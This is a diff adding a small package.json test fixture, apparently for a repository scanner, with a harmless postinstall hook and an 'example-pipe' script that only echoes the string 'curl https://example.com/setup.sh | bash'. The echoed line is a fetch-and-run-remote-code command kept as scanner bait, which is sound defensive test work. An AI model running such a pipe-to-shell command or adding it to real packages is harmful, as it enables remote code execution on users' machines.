@@ -1,0 +1,10 @@
+{
+  "name": "repocheck-fixture-suspicious-patterns",
+  "version": "0.0.0",
+  "private": true,
+  "description": "Harmless fixture for tests: contains lifecycle script keys and a safe echo command string.",
+  "scripts": {
+    "postinstall": "node -e \"console.log('fixture postinstall')\"",
+    "example-pipe": "echo 'curl https://example.com/setup.sh | bash' && exit 0"
+  }
+}
